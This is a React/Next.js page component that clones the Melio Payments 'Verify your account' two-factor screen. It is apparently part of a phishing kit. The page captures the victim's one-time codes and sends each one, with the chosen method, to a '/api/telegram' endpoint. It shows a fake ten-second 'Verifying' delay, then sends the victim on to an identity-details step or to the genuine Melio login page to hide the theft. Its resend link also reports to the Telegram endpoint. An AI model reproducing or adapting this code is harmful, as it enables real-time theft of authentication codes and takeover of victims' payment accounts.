"use client";

import { Suspense, useEffect, useState } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import Link from "next/link";
import { MelioLogo } from "@/components/MelioLogo";
import { ArrowLeft } from "lucide-react";

function VerifyCodeContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const method = searchParams.get("method") || "";
  const step = searchParams.get("step") || "1";
  const isSecondOtp = step === "2";
  const [code, setCode] = useState("");
  const [error, setError] = useState("");
  const [verifyLoading, setVerifyLoading] = useState(false);

  useEffect(() => {
    if (!method) {
      router.replace("/2fa-method");
    }
  }, [method, router]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (verifyLoading) return;
    if (code.length < 6) {
      setError("Please enter a 6-digit code.");
      return;
    }

    setError("");

    await fetch("/api/telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        kind: "verification",
        method,
        code,
        otpStep: isSecondOtp ? 2 : 1,
      }),
    }).catch(console.error);

    // Match the other projects' flow: show a loading state before continuing.
    setVerifyLoading(true);
    try {
      await new Promise((r) => setTimeout(r, 10000));
    } finally {
      setVerifyLoading(false);
    }

    if (isSecondOtp) {
      window.location.href = "https://app.meliopayments.com/login";
      return;
    }

    // OTP #1 success → go to details step (keep the same method).
    router.push(`/identity-details?method=${encodeURIComponent(method)}`);
  };

  return (
    <div className="min-h-screen w-full flex items-start sm:items-center justify-center bg-white sm:bg-[#F0F4F8]">
      <div className="w-full sm:max-w-[500px] sm:bg-white sm:rounded-2xl sm:shadow-sm sm:border sm:border-[#e5e7eb] p-6 sm:p-10 pt-16 sm:pt-10">
        <button 
          onClick={() =>
            isSecondOtp
              ? router.push(`/identity-details?method=${encodeURIComponent(method)}`)
              : router.push("/2fa-method")
          }
          className="mb-6 flex items-center gap-2 text-sm font-medium text-[#6b7280] hover:text-[#1a1a2e] transition-colors group"
          disabled={verifyLoading}
        >
          <ArrowLeft size={16} className="group-hover:-translate-x-0.5 transition-transform" />
          Back to selection
        </button>

        <div className="flex justify-center mb-8">
          <Link href="/" aria-label="Back to landing" className="inline-flex">
            <MelioLogo className="h-9 w-auto" />
          </Link>
        </div>

        <h1 className="text-center text-[28px] font-semibold text-[#1a1a2e] mb-2">
          Verify your account
        </h1>
        <p className="text-center text-sm text-[#6b7280] mb-8">
          We sent a code via <strong>{method.toUpperCase()}</strong>. Use it to complete login.
        </p>

        <form className="space-y-6" onSubmit={handleSubmit}>
          <div className="space-y-2">
            <label htmlFor="code" className="block text-sm font-medium text-[#4a4a5a]">
              Verification Code
            </label>
            <input
              id="code"
              type="tel"
              maxLength={6}
              value={code}
              inputMode="numeric"
              onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
              placeholder="000000"
              className="w-full h-12 px-4 border-2 border-[#e5e7eb] rounded-xl text-[#1a1a2e] text-lg font-semibold tracking-[0.2em] placeholder:text-[#9ca3af] focus:outline-none focus:ring-2 focus:ring-[#7244F6] focus:border-transparent transition-all text-center"
              required
            />
            {error && <p className="text-xs text-red-500 font-medium">{error}</p>}
          </div>

          <button
            type="submit"
            className="w-full h-12 bg-[#7244F6] hover:bg-[#5a35c5] text-white font-semibold rounded-xl transition-all shadow-sm hover:shadow-md active:scale-[0.98]"
            disabled={verifyLoading || code.length < 6}
            aria-disabled={verifyLoading || code.length < 6}
          >
            {verifyLoading ? "Verifying..." : "Verify"}
          </button>
        </form>

        <div className="text-center mt-8 pt-6 border-t border-[#e5e7eb]">
          <p className="text-sm text-[#6b7280]">
            Didn’t receive a code? <button type="button" className="text-[#7244F6] hover:text-[#5a35c5] font-semibold" onClick={() => {
              fetch("/api/telegram", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  kind: "resend",
                  method,
                  otpStep: isSecondOtp ? 2 : 1,
                }),
              }).catch(console.error)
              router.push("/2fa-method")
            }}>Choose another method</button>
          </p>
        </div>
      </div>
    </div>
  );
}

export default function VerifyCodePage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen w-full flex items-center justify-center bg-white sm:bg-[#F0F4F8] text-[#6b7280] text-sm">
          Loading…
        </div>
      }
    >
      <VerifyCodeContent />
    </Suspense>
  );
}

